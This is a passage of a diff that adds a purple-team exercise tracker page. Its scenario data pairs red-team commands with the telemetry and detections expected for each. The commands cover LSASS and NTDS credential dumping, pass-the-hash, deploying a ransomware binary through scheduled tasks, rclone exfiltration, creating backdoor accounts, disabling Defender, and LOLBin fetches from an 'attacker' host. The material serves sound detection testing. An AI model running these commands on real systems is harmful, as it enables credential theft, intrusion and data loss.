+          red_cmd:'# Classic\ntasklist /fi "imagename eq lsass.exe"\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\temp\\lsass.dmp full\n# OR mimikatz "sekurlsa::logonpasswords"',
+          telemetry:'EDR LSASS access events · Sysmon EventID 10 · Defender ASR rule events',
+          detection:'LSASS access by non-system process rule · ASR rule "Block credential stealing from LSASS"' },
+      ]},
+      { id:'DI', name:'Discovery', techniques:[
+        { id:'T1018', name:'Remote System Discovery',
+          red:'Enumerate the AD environment.',
+          red_cmd:'net group "Domain Admins" /domain\nnltest /dclist:domain.local\n# OR BloodHound SharpHound\nSharpHound.exe -c All',
+          telemetry:'Domain controller event logs · LDAP query logs · EDR command-line · network NDR',
+          detection:'BloodHound/SharpHound query pattern rule · suspicious LDAP query volume · "net group" command-line alert' },
+        { id:'T1087.002', name:'Account Discovery: Domain Account',
+          red:'Pull domain user list and groups.',
+          red_cmd:'net user /domain\nGet-ADUser -Filter * -Properties memberof',
+          telemetry:'DC event logs · 4662 directory service access',
+          detection:'Enumeration query pattern · baseline deviation rule' },
+      ]},
+      { id:'LM', name:'Lateral Movement', techniques:[
+        { id:'T1021.002', name:'Remote Services: SMB/Windows Admin Shares',
+          red:'Move laterally using stolen credentials.',
+          red_cmd:'# Pass-the-hash or pass-the-ticket\nsekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<hash> /run:cmd.exe\n# OR psexec\npsexec.exe \\\\target -u DOMAIN\\admin -p ... cmd.exe',
+          telemetry:'4624 logon type 3 · 4672 special privileges · network flow logs',
+          detection:'PSExec service install rule · anomalous admin logon source · lateral movement detection' },
+        { id:'T1570', name:'Lateral Tool Transfer',
+          red:'Copy implant/ransomware to multiple hosts via SMB.',
+          red_cmd:'copy ransom.exe \\\\target\\C$\\Windows\\Temp\\\nschtasks /create /s target /tn evil /tr C:\\Windows\\Temp\\ransom.exe /sc onstart /ru SYSTEM',
+          telemetry:'4663 file access · SMB share write events · EDR file creation',
+          detection:'Write to admin share by user account · scheduled task creation on remote host' },
+      ]},
+      { id:'EX2', name:'Exfiltration & Impact', techniques:[
+        { id:'T1567.002', name:'Exfiltration to Cloud Storage',
+          red:'Stage data and exfil to attacker-controlled cloud bucket (or via rclone).',
+          red_cmd:'rclone copy C:\\stagedata remote:bucket --transfers=32\n# OR curl/PowerShell to S3/MEGA/WebDAV',
+          telemetry:'Proxy/firewall egress to cloud storage · DLP · EDR network · DNS query logs',
+          detection:'Large outbound transfer to cloud storage · new-domain alert · DLP volume threshold' },
+        { id:'T1486', name:'Data Encrypted for Impact',
+          red:'Execute ransomware payload on multiple hosts simultaneously.',
+          red_cmd:'# DO NOT run real ransomware in production. Use a controlled emulation like Atomic Red Team T1486 marker file creation.',
+          telemetry:'File modification volume spike · EDR mass-write alerts · backup system anomalies',
+          detection:'Mass file rename / encryption pattern detection · shadow copy deletion rule · ransomware behavioural rule' },
+      ]}
+    ]
+  },
+
+  /* ============================================================
+     2. INITIAL ACCESS BROKER
+     ============================================================ */
+  iab: {
+    id:'iab',
+    name:'Initial access broker',
+    tagline:'Get in, persist, hand off. Tests early-stage detection where the work usually fails.',
+    profile:'A specialist who acquires footholds and sells them. Quiet by design. Goal is durable access, not impact. Will avoid actions that get noticed.',
+    phases:[
+      { id:'IA', name:'Initial Access', techniques:[
+        { id:'T1078', name:'Valid Accounts',
+          red:'Use credentials from infostealer log / breach corpus. Test login from new geo to a single user.',
+          red_cmd:'# Authenticate via VPN / SSO / OWA with stolen credential\n# Test triggers conditional access where present',
+          telemetry:'IdP sign-in logs · conditional access logs · VPN logs · O365 sign-in logs',
+          detection:'Impossible travel alert · new device/location for user · MFA fatigue indicators' },
+        { id:'T1110.003', name:'Brute Force: Password Spraying',
+          red:'Spray a small dictionary against discovered usernames, slow rate to avoid lockout.',
+          red_cmd:'# DomainPasswordSpray or similar; rate-limit to ~3 attempts per 30 min per user',
+          telemetry:'IdP failed-sign-in volume · 4625 across multiple usernames',
+          detection:'Low-and-slow auth failure pattern across many users · risk-based authentication score' },
+      ]},
+      { id:'EX', name:'Execution & Persistence', techniques:[
+        { id:'T1136.001', name:'Create Account: Local Account',
+          red:'Create a local backdoor account on a foothold host.',
+          red_cmd:'net user backdoor P@ssw0rd! /add\nnet localgroup administrators backdoor /add',
+          telemetry:'4720 user account created · 4732 added to local admins',
+          detection:'New local admin account creation rule · alert on admin group additions' },
+        { id:'T1098', name:'Account Manipulation',
+          red:'Add a password to an existing service account or modify ACLs for persistent access.',
+          red_cmd:'Set-ADUser -Identity svc_backup -AccountPassword (ConvertTo-SecureString "Win2025!" -AsPlainText -Force)',
+          telemetry:'4738 user account changed · 4724 password reset attempt',
+          detection:'Service account password changed alert · ACL modification rule' },
+        { id:'T1505.003', name:'Server Software Component: Web Shell',
+          red:'Drop a web shell on an internet-facing server (only if in scope).',
+          red_cmd:'# Place obfuscated .aspx/.jsp/.php shell\n# Lab: use a marker file, not a functional shell',
+          telemetry:'Web server access logs · WAF · file integrity monitoring · EDR on web server',
+          detection:'Suspicious file write to web root · WAF anomaly on shell-like params · FIM on production webroot' },
+      ]},
+      { id:'DE', name:'Defense Evasion', techniques:[
+        { id:'T1562.001', name:'Impair Defenses: Disable Tools',
+          red:'Attempt to stop EDR/AV services to test tampering protection.',
+          red_cmd:'sc stop "Sense"\nsc config "WinDefend" start=disabled\n# Note: should fail with tamper protection',
+          telemetry:'Service state change events · EDR self-protection events',
+          detection:'EDR service tamper alert · service stop attempt on security tools rule' },
+      ]},
+      { id:'C2', name:'Command & Control', techniques:[
+        { id:'T1071.001', name:'Application Layer Protocol: Web',
+          red:'Establish low-and-slow C2 over HTTPS to legitimate-looking domain.',
+          red_cmd:'# Cobalt Strike beacon with malleable profile mimicking jquery.com\n# Sleep 6 hours, jitter 50%',
+          telemetry:'Proxy logs · DNS · netflow · EDR network',
+          detection:'Beaconing detection (interval analysis) · newly observed domain · JA3 fingerprint anomaly' },
+      ]}
+    ]
+  },
+
+  /* ============================================================
+     3. INSIDER THREAT
+     ============================================================ */
+  insider: {
+    id:'insider',
+    name:'Insider threat — malicious leaver',
+    tagline:'No initial access needed. Tests data-loss prevention, departing-employee monitoring, anomaly detection.',
+    profile:'A leaving employee with legitimate access who decides to take customer data or IP on their way out. Knows the systems. Does not need malware.',
+    phases:[
+      { id:'CO', name:'Collection', techniques:[
+        { id:'T1005', name:'Data from Local System',
+          red:'Browse and copy sensitive files from local drives.',
+          red_cmd:'# legitimate user activity — focus on volume and pattern',
+          telemetry:'File access auditing · DLP endpoint module · UEBA',
+          detection:'Unusual access volume for user · access to files outside normal role · UEBA risk score elevation' },
+        { id:'T1213', name:'Data from Information Repositories',
+          red:'Bulk download from SharePoint / Confluence / wiki / shared drive.',
+          red_cmd:'# Web UI bulk export, or sync entire site/drive via OneDrive/Drive client',
+          telemetry:'SharePoint/Drive audit logs · CASB · large download events',
+          detection:'Bulk download alert · DLP rule on sensitive content type · CASB anomaly' },
+      ]},
+      { id:'EX', name:'Exfiltration', techniques:[
+        { id:'T1052.001', name:'Exfiltration over USB',
+          red:'Copy data to USB mass storage.',
+          red_cmd:'# Plug USB, copy files; test against device control policy',
+          telemetry:'EDR removable media events · 6416 PnP device · DLP USB module',
+          detection:'USB write event for sensitive data · device control block (preferred) · alert if write allowed' },
+        { id:'T1567.001', name:'Exfiltration to Cloud Storage',
+          red:'Upload data to personal cloud account (Dropbox, personal Gmail, WeTransfer).',
+          red_cmd:'# Browser upload to personal cloud',
+          telemetry:'Proxy URL category logs · CASB · DLP web module',
+          detection:'Upload to personal cloud blocked/alerted by web filter · DLP volume rule' },
+        { id:'T1048.003', name:'Exfiltration Over Unencrypted Protocol',
+          red:'Email sensitive content to personal address.',
+          red_cmd:'# Compose & send via corporate mail to external personal address',
+          telemetry:'Email gateway logs · DLP email module',
+          detection:'External recipient + sensitive content classification · auto-quarantine rule · alert to manager' },
+      ]},
+      { id:'CR', name:'Credential & Account Misuse', techniques:[
+        { id:'T1078.002', name:'Valid Accounts: Domain Accounts',
+          red:'Use shared service account credentials known from prior role.',
+          red_cmd:'# Authenticate as shared service account from user workstation',
+          telemetry:'4624 logon · service account usage tracking',
+          detection:'Service account interactive logon alert · service account used outside normal source' },
+      ]}
+    ]
+  },
+
+  /* ============================================================
+     4. SUPPLY CHAIN COMPROMISE
+     ============================================================ */
+  supplychain: {
+    id:'supplychain',
+    name:'Supply chain compromise',
+    tagline:'Trusted software does untrusted things. Tests behavioural detection rather than IOC matching.',
+    profile:'Adversary has compromised a software vendor or package the org uses. Malicious update ships through legitimate channels and is signed by the vendor.',
+    phases:[
+      { id:'IA', name:'Initial Access', techniques:[
+        { id:'T1195.002', name:'Supply Chain: Compromise Software Supply Chain',
+          red:'Simulate a malicious update from a trusted vendor — install a benign signed-but-flagged binary that performs suspicious actions post-install.',
+          red_cmd:'# Use a known purple team binary or atomic test that mimics post-install C2 behaviour\n# Run installer with valid signature from vendor cert',
+          telemetry:'Software inventory · EDR install events · MDM/SCCM update logs',
+          detection:'Behavioural — installer spawning shells or network connections post-install is the signal, not the install itself' },
+      ]},
+      { id:'EX', name:'Execution', techniques:[
+        { id:'T1059.001', name:'PowerShell (post-install)',
+          red:'Compromised software spawns PowerShell to phone home.',
+          red_cmd:'# Same as ransomware scenario but parent is legitimate vendor binary',
+          telemetry:'EDR process tree showing vendor.exe → powershell.exe',
+          detection:'Parent-child anomaly rule keyed on vendor processes spawning shells (where this should be rare)' },
+        { id:'T1218', name:'System Binary Proxy Execution',
+          red:'Use signed Microsoft binary (LOLBin) to execute downloaded content.',
+          red_cmd:'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject(...)\n# OR msiexec /q /i http://attacker/payload.msi',
+          telemetry:'EDR command line · Sysmon process create · proxy logs',
+          detection:'LOLBin rule set (rundll32 with unusual args, msiexec with URL, regsvr32 with /i:http, etc.)' },
+      ]},
+      { id:'C2', name:'Command & Control', techniques:[
+        { id:'T1090.001', name:'Internal Proxy',
+          red:'Compromised vendor agent on multiple hosts uses one as internal proxy back to attacker.',
+          red_cmd:'# Configure beacon to use peer over named pipe / SMB to internal jump host',
+          telemetry:'Internal network flow logs · EDR network · firewall east-west',
+          detection:'East-west traffic pattern rule · anomalous peer connectivity for vendor process' },
+      ]},
+      { id:'IM', name:'Impact', techniques:[
+        { id:'T1485', name:'Data Destruction',
+          red:'Wiper variant — destructive supply chain (rare but tests blast radius).',
+          red_cmd:'# Use destructive marker only in lab; e.g. drop benign file then mass-delete in isolated test VM',
+          telemetry:'File deletion event volume · backup integrity · EDR',
+          detection:'Mass file deletion alert · destruction-shaped behaviour rule · backup verification job alert' },
+      ]}
+    ]
+  },
+
+  /* ============================================================
+     5. BUSINESS EMAIL COMPROMISE (BEC)
+     ============================================================ */
+  bec: {
+    id:'bec',
+    name:'Business Email Compromise',
+    tagline:'No malware. Phishing for credentials, mailbox rules, wire fraud. Tests email security and identity monitoring.',
+    profile:'Financial fraudster targeting finance/exec users. Goal is to compromise an account, monitor email, and divert a real wire transfer.',
+    phases:[
+      { id:'IA', name:'Initial Access', techniques:[
+        { id:'T1566.002', name:'Spearphishing Link',
+          red:'Send a credential-harvesting email mimicking O365 login.',
+          red_cmd:'# Set up a credential harvester clone of login.microsoftonline.com\n# Send link to finance director from spoofed CEO',
+          telemetry:'Email gateway logs · O365 ATP Safe Links · proxy logs',
+          detection:'URL reputation alert · O365 ATP click event · DMARC failure · brand impersonation rule' },
+        { id:'T1078.004', name:'Valid Accounts: Cloud Accounts',
+          red:'Authenticate to O365 / Google Workspace with harvested credential. Bypass MFA via real-time AiTM (Evilginx-style) if MFA is push.',
+          red_cmd:'# AiTM proxy intercepts the session token after legitimate MFA approval',
+          telemetry:'IdP sign-in logs · session token issuance · unusual user agent',
+          detection:'New device + new geo + token replay indicators · session anomaly · risk-based auth' },
+      ]},
+      { id:'PE', name:'Persistence', techniques:[
+        { id:'T1564.008', name:'Hide Artifacts: Email Hiding Rules',
+          red:'Create mailbox rule to auto-delete or move security alerts and finance reply emails.',
+          red_cmd:'# Via OWA / Graph API\nNew-InboxRule -Name "Updates" -SubjectContainsWords "invoice","wire","payment" -MoveToFolder "RSS Feeds" -MarkAsRead $true',
+          telemetry:'O365 mailbox audit log · Set-InboxRule events',
+          detection:'Suspicious mailbox rule alert (rules hiding security/finance content) · UEBA on mailbox config changes' },
+      ]},
+      { id:'CO', name:'Collection & Recon', techniques:[
+        { id:'T1114.002', name:'Email Collection: Remote Email Collection',
+          red:'Read sent items and finance threads to understand context and timing of upcoming payments.',
+          red_cmd:'# Via OWA — read invoices, reply threads, contact patterns',
+          telemetry:'Mailbox access audit · MailItemsAccessed events (E5)',
+          detection:'Unusual mailbox access volume · access to historical items rarely opened' },
+      ]},
+      { id:'IM', name:'Impact', techniques:[
+        { id:'T1565.001', name:'Data Manipulation: Stored Data',
+          red:'Modify an invoice PDF in user mail with attacker-controlled bank details, reply-all asking for "updated payment to be processed".',
+          red_cmd:'# Send altered invoice from compromised account, suppress reply via rule from earlier',
+          telemetry:'Email send events from compromised account · DLP on outbound attachments · finance approval workflow logs',
+          detection:'Anomalous send pattern from user (volume, recipients, content) · finance manual verification of bank-detail changes (process control)' },
+      ]}
+    ]
+  },
+
+  /* ============================================================
+     6. LIVING OFF THE LAND (LOTL)
+     ============================================================ */
+  lotl: {
+    id:'lotl',
+    name:'Living-off-the-land operator',
+    tagline:'Built-in Windows tools only. No malware. Tests behavioural and anomaly detection, not IOC matching.',
+    profile:'Skilled actor (state-aligned or top-tier criminal) using only signed Microsoft binaries (LOLBins) and built-in admin tools. Designed to evade signature-based controls.',
+    phases:[
+      { id:'EX', name:'Execution', techniques:[
+        { id:'T1059.003', name:'Command and Scripting Interpreter: Windows Command Shell',
+          red:'Use cmd.exe with built-in tools for full chain — no third-party binaries.',
+          red_cmd:'cmd /c "for /f %i in (\'dir /b *.docx\') do echo %i >> list.txt"',
+          telemetry:'4688 process create with command line · Sysmon EventID 1',
+          detection:'Command-line entropy / pattern detection · suspicious cmd.exe child chains' },
+        { id:'T1218.011', name:'System Binary Proxy Execution: Rundll32',
+          red:'Execute code via rundll32 + COM scriptlet.',
+          red_cmd:'rundll32.exe javascript:"\\..\\mshtml.dll,RunHTMLApplication "+document.write(...)',
+          telemetry:'Sysmon process create · EDR command line',
+          detection:'rundll32 with javascript: arg rule · rundll32 spawning shell' },
+        { id:'T1218.005', name:'System Binary Proxy Execution: Mshta',
+          red:'Execute remote HTA via mshta.',
+          red_cmd:'mshta.exe http://attacker/script.hta',
+          telemetry:'Process create · proxy URL · DNS',
+          detection:'mshta with remote URL rule · mshta network connection alert' },
+      ]},
+      { id:'DI', name:'Discovery', techniques:[
+        { id:'T1087.002', name:'Account Discovery: Domain Account',
+          red:'Use only built-in tools to enumerate.',
+          red_cmd:'net group "domain admins" /domain\nnet user /domain\nwmic /node:dc01 useraccount get name',
+          telemetry:'DC LDAP query logs · 4662 directory access',
+          detection:'Enumeration pattern (multiple net/wmic commands in short window) · baseline deviation' },
+        { id:'T1482', name:'Domain Trust Discovery',
+          red:'Map trust relationships.',
+          red_cmd:'nltest /domain_trusts /all_trusts\ndsquery * -filter "(objectClass=trustedDomain)"',
+          telemetry:'DC event logs',
+          detection:'Trust enumeration command-line rule' },
+      ]},
+      { id:'CR', name:'Credential Access', techniques:[
+        { id:'T1003.003', name:'OS Credential Dumping: NTDS',
+          red:'Use built-in tools to extract NTDS.dit via volume shadow copy.',
+          red_cmd:'vssadmin create shadow /for=C:\nntdsutil "activate instance ntds" "ifm" "create full c:\\temp" quit quit\n# OR diskshadow scripted',
+          telemetry:'4688 process create · 4663 file access to NTDS.dit · vssadmin event',
+          detection:'vssadmin create shadow + ntdsutil pattern · access to NTDS.dit by non-DC process' },
+        { id:'T1558.003', name:'Kerberoasting',
+          red:'Request service tickets and crack offline.',
+          red_cmd:'# Built-in: \nklist get HTTP/svc01\n# OR Rubeus (third-party — substitute setspn -t for built-in recon)\nsetspn -t domain.local -q */*',
+          telemetry:'4769 Kerberos service ticket request',
+          detection:'4769 anomaly: account requesting many SPNs of different services · RC4 encryption requested by user (modern AD should use AES)' },
+      ]},
+      { id:'LM', name:'Lateral Movement', techniques:[
+        { id:'T1021.006', name:'Remote Services: WinRM',
+          red:'Use built-in WinRM for lateral movement.',
+          red_cmd:'winrs -r:target cmd\nInvoke-Command -ComputerName target -ScriptBlock { whoami }',
+          telemetry:'4624 logon type 3 from network · WinRM events · 4688 wsmprovhost.exe',
+          detection:'wsmprovhost.exe spawning unusual children · anomalous WinRM source host · pivot detection' },
+      ]}
+    ]
+  }
+
+});
+</script>
+<script>
+/* ================================================================
+   STATE & PERSISTENCE
+   ================================================================ */
+let state = {
+  scenario:'ransomware',
+  setup:{name:'',date:'',red_lead:'',blue_lead:'',scope:''},
+  records:{},
+  filters:{blue:'all',gap:null,search:''}
+};
+const STORAGE_KEY='dh-purple-exercise-v1';
+const THEME_KEY='dh-theme';
+
+function setTheme(t){
+  document.documentElement.setAttribute('data-theme',t);
+  try{localStorage.setItem(THEME_KEY,t)}catch(e){}
+}
+function toggleTheme(){
+  const cur=document.documentElement.getAttribute('data-theme')||'light';
+  setTheme(cur==='light'?'dark':'light');
+}
+(function(){
+  let saved=null;
+  try{saved=localStorage.getItem(THEME_KEY)}catch(e){}
+  if(saved)setTheme(saved);
+})();
+
+function persist(){
+  try{localStorage.setItem(STORAGE_KEY,JSON.stringify(state))}catch(e){}
+}
+function restore(){
+  try{
+    const s=localStorage.getItem(STORAGE_KEY);
+    if(s){
+      const parsed=JSON.parse(s);
+      if(parsed&&typeof parsed==='object'){
+        state=Object.assign(state,parsed);
+        if(!state.filters)state.filters={blue:'all',gap:null,search:''};
+        return true;
+      }
+    }
+  }catch(e){}
+  return false;
+}
+
+function saveState(){
+  const blob=new Blob([JSON.stringify(state,null,2)],{type:'application/json'});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement('a');
+  const fname=`purple-exercise-${state.scenario}-${new Date().toISOString().slice(0,10)}.json`;
+  a.href=url;a.download=fname;document.body.appendChild(a);a.click();
+  setTimeout(()=>{URL.revokeObjectURL(url);a.remove()},0);
+  toast('Saved '+fname);
+}
+function loadStatePrompt(){
+  const input=document.createElement('input');
+  input.type='file';input.accept='application/json,.json';
+  input.onchange=(e)=>{
+    const f=e.target.files[0];if(!f)return;
+    const r=new FileReader();
+    r.onload=()=>{
+      try{
+        const parsed=JSON.parse(r.result);
+        if(!parsed.records)throw new Error('Not an exercise file');
+        state=Object.assign({scenario:'ransomware',setup:{},records:{},filters:{blue:'all'}},parsed);
+        if(!state.filters)state.filters={blue:'all',gap:null,search:''};
+        persist();renderAll();fillSetupFields();toast('Loaded '+f.name);
+      }catch(err){toast('Could not load — '+err.message)}
+    };
+    r.readAsText(f);
+  };
+  input.click();
+}
+function resetState(){
+  if(!confirm('Reset the exercise? This clears all findings and notes. Consider SAVE first.'))return;
+  state={
+    scenario:state.scenario,
+    setup:{name:'',date:'',red_lead:'',blue_lead:'',scope:''},
+    records:{},
+    filters:{blue:'all',gap:null,search:''}
+  };
+  persist();fillSetupFields();renderAll();toast('Reset');
+}
+
+let toastTimer;
+function toast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer=setTimeout(()=>t.classList.remove('show'),2400);
+}
+
+document.addEventListener('keydown',(e)=>{
+  if(e.key==='Escape'){
+    const m=document.getElementById('exportModal');
+    if(m.classList.contains('show'))closeModal();
+  }
+});
+
+/* ================================================================
+   RECORD HELPERS
+   ================================================================ */
+function recordKey(scnId,techId){return scnId+':'+techId}
+function getRecord(scnId,techId){
+  const k=recordKey(scnId,techId);
+  if(!state.records[k]){
+    state.records[k]={
+      red_status:'planned',
+      blue_status:'unset',
+      ttd:'',
+      notes:'',
+      actions:[]
+    };
+  }
+  return state.records[k];
+}
+function setRecord(scnId,techId,partial){
+  const r=getRecord(scnId,techId);
+  Object.assign(r,partial);
+  state.records[recordKey(scnId,techId)]=r;
+  persist();
+}
+
+function pickScenario(id){
+  state.scenario=id;
+  state.filters.search='';state.filters.gap=null;
+  const si=document.getElementById('techSearch');if(si)si.value='';
+  persist();renderAll();
+  setTimeout(()=>document.getElementById('techContainer').scrollIntoView({behavior:'smooth',block:'start'}),50);
+}
+
+function setFilter(group,value){
+  if(group==='blue')state.filters.blue=value;
+  else if(group==='gap')state.filters.gap=(state.filters.gap===value)?null:value;
+  persist();renderTechniques();renderFilterChips();
+}
+function onSearch(){
+  state.filters.search=document.getElementById('techSearch').value.toLowerCase().trim();
+  persist();renderTechniques();
+}
+function renderFilterChips(){
+  document.querySelectorAll('.filter-chip').forEach(chip=>{
+    const g=chip.getAttribute('data-filter');
+    const v=chip.getAttribute('data-value');
+    let active=false;
+    if(g==='blue')active=(state.filters.blue===v);
+    else if(g==='gap')active=state.filters.gap===v;
+    chip.classList.toggle('active',active);
+  });
+}
+
+/* ================================================================
+   COUNTING / DASHBOARD
+   ================================================================ */
+function countByScenario(scnId){
+  const scn=SCENARIOS[scnId];
+  let total=0,alerted=0,logged=0,notdetected=0,blocked=0,unset=0,backlog=0;
+  scn.phases.forEach(p=>{
+    p.techniques.forEach(t=>{
+      total++;
+      const r=state.records[recordKey(scnId,t.id)];
+      const bs=r?r.blue_status:'unset';
+      if(bs==='alerted')alerted++;
+      else if(bs==='logged')logged++;
+      else if(bs==='notdetected')notdetected++;
+      else if(bs==='blocked')blocked++;
+      else unset++;
+      if(r&&r.actions)backlog+=r.actions.filter(a=>a&&a.trim()).length;
+    });
+  });
+  return {total,alerted,logged,notdetected,blocked,unset,backlog};
+}
+
+function renderScnPicker(){
+  const el=document.getElementById('scnPicker');
+  el.innerHTML='';
+  Object.values(SCENARIOS).forEach(scn=>{
+    const tcount=scn.phases.reduce((s,p)=>s+p.techniques.length,0);
+    const c=countByScenario(scn.id);
+    const btn=document.createElement('button');
+    btn.className='scn-chip'+(state.scenario===scn.id?' active':'');
+    btn.onclick=()=>pickScenario(scn.id);
+    btn.innerHTML=`
+      <span class="scn-name">${scn.name}</span>
+      <span class="scn-tagline">${scn.tagline}</span>
+      <span class="scn-meta">${tcount} TECHNIQUES · ${c.alerted}/${tcount} ALERTED</span>
+    `;
+    el.appendChild(btn);
+  });
+}
+
+function renderDashboard(){
+  const scn=SCENARIOS[state.scenario];
+  document.getElementById('dash-scname').textContent=scn.name;
+  const c=countByScenario(state.scenario);
+  document.getElementById('dash-alerted').textContent=c.alerted;
+  document.getElementById('dash-total').textContent=c.total;
+  const detected=c.alerted+c.blocked;
+  const pct=c.total>0?Math.round((detected/c.total)*100):0;
+  document.getElementById('dash-pct').textContent=pct+'%';
+  const pb=document.getElementById('dash-pb');
+  pb.innerHTML='';
+  [{cls:'pb-alerted',n:c.alerted},{cls:'pb-blocked',n:c.blocked},{cls:'pb-logged',n:c.logged},{cls:'pb-notdetected',n:c.notdetected}].forEach(s=>{
+    if(s.n>0){
+      const d=document.createElement('div');
+      d.className='pb-seg '+s.cls;
+      d.style.width=((s.n/c.total)*100)+'%';
+      pb.appendChild(d);
+    }
+  });
+
+  const gaps=document.getElementById('dash-gaps');
+  gaps.innerHTML='';
+  if(c.notdetected>0)gaps.insertAdjacentHTML('beforeend',`<div class="alert warn"><span class="num">${c.notdetected}</span><span class="lbl">techniques not detected</span></div>`);
+  if(c.logged>0)gaps.insertAdjacentHTML('beforeend',`<div class="alert"><span class="num">${c.logged}</span><span class="lbl">logged but not alerted</span></div>`);
+  if(c.backlog>0)gaps.insertAdjacentHTML('beforeend',`<div class="alert"><span class="num">${c.backlog}</span><span class="lbl">backlog items captured</span></div>`);
+  if(c.notdetected===0&&c.logged===0&&c.backlog===0)gaps.insertAdjacentHTML('beforeend',`<div class="alert empty">No gaps yet — start running techniques to surface them.</div>`);
+
+  const phases=document.getElementById('dash-phases');
+  phases.innerHTML='';
+  scn.phases.forEach(p=>{
+    let alerted=0,total=p.techniques.length;
+    p.techniques.forEach(t=>{
+      const r=state.records[recordKey(scn.id,t.id)];
+      if(r&&(r.blue_status==='alerted'||r.blue_status==='blocked'))alerted++;
+    });
+    const pct=Math.round((alerted/total)*100);
+    phases.insertAdjacentHTML('beforeend',`
+      <div class="alert">
+        <span class="num">${alerted}/${total}</span>
+        <span class="lbl">${p.name}</span>
+        <span class="mono" style="color:var(--text-dim);font-size:.74rem">${pct}%</span>
+      </div>
+    `);
+  });
+
+  document.getElementById('stat-techniques').textContent=c.total;
+  document.getElementById('stat-alerted').textContent=c.alerted;
+  document.getElementById('stat-logged').textContent=c.logged;
+  document.getElementById('stat-notdetected').textContent=c.notdetected;
+  document.getElementById('stat-backlog').textContent=c.backlog;
+}
+
+/* ================================================================
+   TECHNIQUES LIST
+   ================================================================ */
+function renderTechniques(){
+  const scn=SCENARIOS[state.scenario];
+  const container=document.getElementById('techContainer');
+  container.innerHTML='';
+  let totalShown=0;
+  scn.phases.forEach(phase=>{
+    const matching=phase.techniques.filter(t=>techMatchesFilters(scn.id,t));
+    if(matching.length===0)return;
+    let alerted=0;
+    phase.techniques.forEach(t=>{
+      const r=state.records[recordKey(scn.id,t.id)];
+      if(r&&(r.blue_status==='alerted'||r.blue_status==='blocked'))alerted++;
+    });
+    const pct=Math.round((alerted/phase.techniques.length)*100);
+    const group=document.createElement('div');
+    group.className='phase-group';
+    group.innerHTML=`
+      <div class="phase-head">
+        <span class="id">${phase.id}</span>
+        <h3>${phase.name}</h3>
+        <span class="meta">${matching.length} of ${phase.techniques.length} shown · <span class="pct">${alerted}/${phase.techniques.length} detected (${pct}%)</span></span>
+      </div>
+      <div class="tech-list"></div>
+    `;
+    const list=group.querySelector('.tech-list');
+    matching.forEach(t=>{
+      list.appendChild(buildTechRow(scn.id,t));
+      totalShown++;
+    });
+    container.appendChild(group);
+  });
+  document.getElementById('emptyState').classList.toggle('show',totalShown===0);
+}
+
+function techMatchesFilters(scnId,t){
+  const r=state.records[recordKey(scnId,t.id)];
+  const bs=r?r.blue_status:'unset';
+  const f=state.filters;
+  if(f.blue!=='all'&&bs!==f.blue)return false;
+  if(f.gap==='hasgap'){
+    if(!r)return false;
+    const hasActions=r.actions&&r.actions.some(a=>a&&a.trim());
+    const isGap=(bs==='notdetected'||bs==='logged');
+    if(!isGap&&!hasActions)return false;
+  }
+  if(f.search){
+    const blob=(t.id+' '+t.name+' '+(t.red||'')+' '+(t.telemetry||'')+' '+(t.detection||'')).toLowerCase();
+    if(!blob.includes(f.search))return false;
+  }
+  return true;
+}
+
+function buildTechRow(scnId,t){
+  const r=getRecord(scnId,t.id);
+  const row=document.createElement('div');
+  row.className='tech'+(r._open?' open':'');
+  row.setAttribute('data-tech',t.id);
+
+  row.innerHTML=`
+    <div class="tech-head" onclick="toggleTech('${scnId}','${t.id}')">
+      <span class="tech-id">${escapeHtml(t.id)}</span>
+      <span class="tech-title">${escapeHtml(t.name)}</span>
+      <span class="tech-status red-status ${r.red_status}"><span class="dotsym"></span>RED · ${redLabel(r.red_status)}</span>
+      <span class="tech-status blue-status ${r.blue_status}"><span class="dotsym"></span>BLUE · ${blueLabel(r.blue_status)}</span>
+      <span class="tech-chev">▾</span>
+    </div>
+    <div class="tech-body">
+
+      <div class="split">
+        <div class="tech-info red-side">
+          <strong class="red-hdr">Red action</strong>
+          <div>${escapeHtml(t.red||'')}</div>
+          ${t.red_cmd?`<pre>${escapeHtml(t.red_cmd)}</pre>`:''}
+        </div>
+        <div class="tech-info blue-side">
+          <strong class="blue-hdr">Expected telemetry</strong>
+          <div>${escapeHtml(t.telemetry||'')}</div>
+          <strong class="blue-hdr" style="margin-top:10px">Expected detection</strong>
+          <div>${escapeHtml(t.detection||'')}</div>
+        </div>
+      </div>
+
+      <div class="tech-form">
+        <div class="field">
+          <label><span class="red-tag">Red</span> Execution status</label>
+          <select onchange="updateRedStatus('${scnId}','${t.id}',this.value)">
+            <option value="planned" ${r.red_status==='planned'?'selected':''}>Planned</option>
+            <option value="executed" ${r.red_status==='executed'?'selected':''}>Executed</option>
+            <option value="blocked" ${r.red_status==='blocked'?'selected':''}>Blocked (couldn't execute)</option>
+            <option value="failed" ${r.red_status==='failed'?'selected':''}>Failed (technical issue)</option>
+          </select>
+        </div>
+        <div class="field">
+          <label><span class="blue-tag">Blue</span> Detection outcome</label>
+          <select onchange="updateBlueStatus('${scnId}','${t.id}',this.value)">
+            <option value="unset" ${r.blue_status==='unset'?'selected':''}>Not yet evaluated</option>
+            <option value="alerted" ${r.blue_status==='alerted'?'selected':''}>Alerted (rule fired)</option>
+            <option value="blocked" ${r.blue_status==='blocked'?'selected':''}>Blocked (prevention worked)</option>
+            <option value="logged" ${r.blue_status==='logged'?'selected':''}>Logged but no alert</option>
+            <option value="notdetected" ${r.blue_status==='notdetected'?'selected':''}>Not detected at all</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Time to detect <span class="hint">(if alerted)</span></label>
+          <input type="text" value="${escapeAttr(r.ttd||'')}" placeholder="e.g. 8 min · within SLA" oninput="updateField('${scnId}','${t.id}','ttd',this.value)">
+        </div>
+        <div class="field full">
+          <label>Notes captured during execution</label>
+          <textarea placeholder="What happened? Which rule fired (or should have)? What did the analyst see?" oninput="updateField('${scnId}','${t.id}','notes',this.value)">${escapeHtml(r.notes||'')}</textarea>
+        </div>
+        <div class="field full">
+          <label>Action items <span class="hint">— becomes the detection backlog</span></label>
+          <div class="action-list" id="acts-${scnId}-${cssSafe(t.id)}">
+            ${(r.actions||[]).map((a,i)=>buildActionRow(scnId,t.id,i,a)).join('')}
+          </div>
